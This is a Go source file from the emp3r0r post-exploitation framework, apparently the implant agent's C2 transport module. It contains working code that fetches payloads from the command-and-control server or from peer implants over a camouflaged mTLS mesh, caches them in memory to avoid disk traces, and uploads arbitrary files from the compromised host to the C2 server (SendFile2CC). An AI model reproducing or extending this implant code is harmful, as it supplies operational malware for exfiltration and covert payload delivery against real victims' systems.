package c2transport

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

var (
	// AgentFileTransferSessions stores active file transfer sessions between agents
	AgentFileTransferSessions sync.Map

	// PeerIPsProvider is set by internal/agent/mesh to return all active mesh peer IPs.
	PeerIPsProvider func() []string

	// PeerFileProvider is set by internal/agent/mesh to return peerIP -> p2pPort for peers holding fileName.
	PeerFileProvider func(fileName string) map[string]int

	// FileServer switch (kept for API compat, file serving is now done in mesh/bridge.go)
	FileServerCtx    context.Context
	FileServerCancel context.CancelFunc
)

// MemFSKey returns the canonical memfs key for a named resource.
// e.g. "/tmp/sa_whoami" and "sa_whoami" both map to "mem:///sa_whoami".
func MemFSKey(name string) string {
	return "mem:///" + filepath.Base(name)
}

// cacheToMemFS stores data in memfs under the canonical key for name.
// It is a best-effort write — errors are only logged.
func cacheToMemFS(name string, data []byte) {
	key := MemFSKey(name)
	if err := util.WriteFileAgent(key, data, 0o600); err != nil {
		logging.Debugf("cacheToMemFS: failed to cache %s as %s: %v", name, key, err)
	} else {
		logging.Debugf("cacheToMemFS: cached %d bytes as %s", len(data), key)
	}
}

// FetchFile is the single entry point for file acquisition.
// Priority order:
//  1. memfs cache (mem:///basename) — checked first, checksum-verified
//  2. explicit destination path (disk or mem:///)
//  3. peer agent via P2P relay (query gossip view for peers advertising the file)
//  4. C2 server (last resort)
//
// On any successful download the data is always cached in memfs under its canonical key.
// If path is empty the raw bytes are returned; otherwise nil is returned after saving.
func FetchFile(config *def.Config, peer, file_to_download, path, checksum string) (data []byte, err error) {
	// 1a. Check memfs cache first (canonical key)
	memKey := MemFSKey(file_to_download)
	if cached, cerr := util.ReadFileAgent(memKey); cerr == nil {
		if checksum == "" || crypto.SHA256SumRaw(cached) == checksum {
			logging.Infof("FetchFile: hit memfs cache %s for %s", memKey, file_to_download)
			if path != "" && path != memKey {
				_ = util.WriteFileAgent(path, cached, 0o600)
			}
			if path == "" {
				return cached, nil
			}
			return nil, nil
		}
	}

	// 1b. Check file_to_download itself on local disk/memfs
	if util.IsFileExist(file_to_download) {
		if existing, rerr := util.ReadFileAgent(file_to_download); rerr == nil {
			if checksum == "" || crypto.SHA256SumRaw(existing) == checksum {
				logging.Infof("FetchFile: %s already exists locally", file_to_download)
				cacheToMemFS(file_to_download, existing)
				if path != "" && path != file_to_download {
					_ = util.WriteFileAgent(path, existing, 0o600)
				}
				if path == "" {
					return existing, nil
				}
				return nil, nil
			}
		}
	}

	// 1c. Check explicit destination path (disk or mem:///)
	if path != "" && path != file_to_download && util.IsFileExist(path) {
		if existing, rerr := util.ReadFileAgent(path); rerr == nil {
			if checksum == "" || crypto.SHA256SumRaw(existing) == checksum {
				logging.Infof("FetchFile: %s already exists at %s", file_to_download, path)
				cacheToMemFS(file_to_download, existing)
				return nil, nil
			}
		}
	}

	// 2. Try peer P2P (query gossip view for peers advertising the file)
	peerMap := make(map[string]int)
	if peer != "" {
		port := 0
		if PeerFileProvider != nil {
			if m := PeerFileProvider(file_to_download); len(m) > 0 {
				port = m[peer]
			}
		}
		peerMap[peer] = port
	} else if PeerFileProvider != nil {
		peerMap = PeerFileProvider(file_to_download)
	}

	if len(peerMap) > 0 {
		for pIP, pPort := range peerMap {
			if pIP == "" {
				continue
			}
			logging.Infof("FetchFile: P2P pull %s from peer %s (port %d)", file_to_download, pIP, pPort)
			for _, name := range []string{memKey, file_to_download} {
				data, err = FetchFilePeerWithPort(pIP, pPort, name, path, checksum)
				if err == nil {
					logging.Infof("FetchFile: P2P success %s from peer %s:%d", name, pIP, pPort)
					if len(data) > 0 {
						cacheToMemFS(file_to_download, data)
					} else if path != "" {
						if saved, rerr := util.ReadFileAgent(path); rerr == nil {
							cacheToMemFS(file_to_download, saved)
						}
					}
					return data, nil
				}
			}
			logging.Warningf("FetchFile: P2P download from peer %s:%d failed (%v)", pIP, pPort, err)
		}
	} else {
		logging.Infof("FetchFile: no mesh peer advertises %s in gossip view — skipping P2P", file_to_download)
	}

	// 3. C2 fallback
	data, err = DownloadViaC2(config, file_to_download, path, checksum)
	if err != nil {
		return nil, err
	}
	// cache whatever we got
	if len(data) > 0 {
		cacheToMemFS(file_to_download, data)
	} else if path != "" {
		if saved, rerr := util.ReadFileAgent(path); rerr == nil {
			cacheToMemFS(file_to_download, saved)
		}
	}
	return data, nil
}

// DownloadViaC2 downloads a file from the C2 server.
// If path is empty the raw bytes are returned.
func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) (data []byte, err error) {
	downloadURL := def.CCAddress + "?file_to_download=" + url.QueryEscape(file_to_download)
	logging.Infof("DownloadViaC2: requesting %s from %s", file_to_download, downloadURL)

	retData := path == ""

	// Lock file for non-mem disk paths to prevent concurrent downloads
	if !retData && !strings.HasPrefix(path, "mem:") {
		lock := fmt.Sprintf("%s.lock", path)
		if util.IsFileExist(lock) {
			return nil, fmt.Errorf("DownloadViaC2: %s is already being downloaded", file_to_download)
		}
		util.CreateFileAgent(lock)
		defer os.RemoveAll(lock)
	}

	conn, _, cancel, err := EstablishC2Connection(def.CCAddress, file_to_download, common.RuntimeConfig.C2Routes.WWW)
	if err != nil {
		return nil, fmt.Errorf("DownloadViaC2 connect: %v", err)
	}
	defer cancel()
	defer conn.Close()
	secureConn := transport.NewSecureConn(conn)

	data, err = io.ReadAll(secureConn)
	if err != nil {
		return nil, fmt.Errorf("DownloadViaC2 read: %v", err)
	}

	if checksum != "" {
		if c := crypto.SHA256SumRaw(data); c != checksum {
			return nil, fmt.Errorf("DownloadViaC2 checksum: got %s want %s", c, checksum)
		}
	}

	logging.Infof("DownloadViaC2: received %d bytes of %s", len(data), file_to_download)

	if retData {
		return data, nil
	}
	if err = util.WriteFileAgent(path, data, 0o600); err != nil {
		return nil, fmt.Errorf("DownloadViaC2 write: %v", err)
	}
	return nil, nil
}

// SendFile2CC send file to CC, with buffering
// using FTP API
func SendFile2CC(filepath string, offset int64, token string) (err error) {
	logging.Infof("Sending %s to CC, offset=%d", filepath, offset)
	// open and read the target file
	data, err := util.ReadFileAgent(filepath)
	if err != nil {
		err = fmt.Errorf("failed to open %s: %v", filepath, err)
		return err
	}

	if offset > int64(len(data)) {
		err = fmt.Errorf("offset %d > file size %d", offset, len(data))
		return err
	}
	data = data[offset:]

	conn, _, _, err := EstablishC2Connection(def.CCAddress, token, common.RuntimeConfig.C2Routes.FTP)
	logging.Infof("FTP connection to %s token=%s", def.CCAddress, token)
	if err != nil {
		err = fmt.Errorf("connection failed: %v", err)
		return err
	}

	// Create a debug wrapper
	secureConn := transport.NewSecureConn(conn)
	defer secureConn.Close()

	// open compressor
	compressor := gzip.NewWriter(secureConn)
	if err != nil {
		err = fmt.Errorf("failed to open compressor: %v", err)
		return err
	}
	defer compressor.Close()

	// Use a 1MB buffer to optimize throughput and reduce polling overhead (especially for the http_poll transport)
	copyBuf := make([]byte, 1024*1024)
	n, err := io.CopyBuffer(compressor, bytes.NewReader(data), copyBuf)
	if err != nil {
		logging.Infof("failed, %d bytes transfered: %v", n, err)
	}
	return err
}

// FetchFilePeer downloads a file directly from a peer agent using the default or advertised P2P port.
func FetchFilePeer(peerIP, file_to_download, path, checksum string) (data []byte, err error) {
	return FetchFilePeerWithPort(peerIP, 0, file_to_download, path, checksum)
}

// FetchFilePeerWithPort downloads a file directly from a peer agent on a specified P2P port over P2P transport.
func FetchFilePeerWithPort(peerIP string, peerPort int, file_to_download, path, checksum string) (data []byte, err error) {
	addr := peerIP
	if !strings.Contains(peerIP, ":") {
		portStr := common.RuntimeConfig.P2PRelayPort
		if peerPort > 0 {
			portStr = fmt.Sprintf("%d", peerPort)
		}
		addr = fmt.Sprintf("%s:%s", peerIP, portStr)
	}

	// Dial using the same transport that ServeRelay uses
	t := transport.GetTransportImplementation(common.RuntimeConfig.P2PTransport)
	if t == nil {
		return nil, fmt.Errorf("FetchFilePeer: transport %q not found", common.RuntimeConfig.P2PTransport)
	}
	if camo, ok := t.(*transport.CamouflageMTLS); ok {
		camo.CertOrg = common.RuntimeConfig.CamouflageCertOrg
		camo.CertCN = common.RuntimeConfig.CamouflageCertCN
	}

	conn, err := t.Dial(addr, common.RuntimeConfig.Password, def.MagicString)
	if err != nil {
		return nil, fmt.Errorf("FetchFilePeer dial %s: %v", addr, err)
	}
	defer conn.Close()

	// Send opcode
	if _, err = conn.Write([]byte{0x03}); err != nil { // OpcodeFileRequest
		return nil, fmt.Errorf("FetchFilePeer send opcode: %v", err)
	}

	// Send 4-byte LE filename length + filename
	name := []byte(file_to_download)
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, uint32(len(name)))
	if _, err = conn.Write(lenBuf); err != nil {
		return nil, fmt.Errorf("FetchFilePeer send name len: %v", err)
	}
	if _, err = conn.Write(name); err != nil {
		return nil, fmt.Errorf("FetchFilePeer send name: %v", err)
	}

	// Read response byte
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	resp := make([]byte, 1)
	if _, err = io.ReadFull(conn, resp); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read response: %v", err)
	}

	if resp[0] == 0xFF { // OpcodeErr
		errLenBuf := make([]byte, 2)
		io.ReadFull(conn, errLenBuf)
		msgLen := binary.LittleEndian.Uint16(errLenBuf)
		msg := make([]byte, msgLen)
		io.ReadFull(conn, msg)
		return nil, fmt.Errorf("FetchFilePeer: peer error: %s", string(msg))
	}
	if resp[0] != 0x00 { // OpcodeOK
		return nil, fmt.Errorf("FetchFilePeer: unexpected response 0x%02x", resp[0])
	}

	// Read 4-byte LE data length
	dataLenBuf := make([]byte, 4)
	if _, err = io.ReadFull(conn, dataLenBuf); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read data len: %v", err)
	}
	dataLen := binary.LittleEndian.Uint32(dataLenBuf)
	conn.SetDeadline(time.Now().Add(5 * time.Minute)) // generous for large files

	// Read all data
	data = make([]byte, dataLen)
	if _, err = io.ReadFull(conn, data); err != nil {
		return nil, fmt.Errorf("FetchFilePeer read data: %v", err)
	}
	conn.SetDeadline(time.Time{})

	// Verify checksum
	if checksum != "" {
		if c := crypto.SHA256SumRaw(data); c != checksum {
			return nil, fmt.Errorf("FetchFilePeer checksum mismatch: got %s want %s", c, checksum)
		}
	}

	logging.Infof("FetchFilePeer: got %d bytes of %s from %s", dataLen, file_to_download, peerIP)

	// Save to path if requested
	if path != "" {
		if err = util.WriteFileAgent(path, data, 0o600); err != nil {
			return nil, fmt.Errorf("FetchFilePeer write: %v", err)
		}
		logging.Infof("FetchFilePeer: saved %s to %s", file_to_download, path)
		return nil, nil
	}
	return data, nil
}

// CancelFileTransfer cancels an ongoing file transfer session
func CancelFileTransfer(clientAddr, filepath string) {
	sessionID := fmt.Sprintf("%s:%s", clientAddr, filepath)

	if val, exists := AgentFileTransferSessions.Load(sessionID); exists {
		cancel := val.(context.CancelFunc)
		cancel()
		logging.Infof("File transfer session for %s canceled", sessionID)
		AgentFileTransferSessions.Delete(sessionID)
	} else {
		logging.Infof("No active file transfer session for %s", sessionID)
	}
}
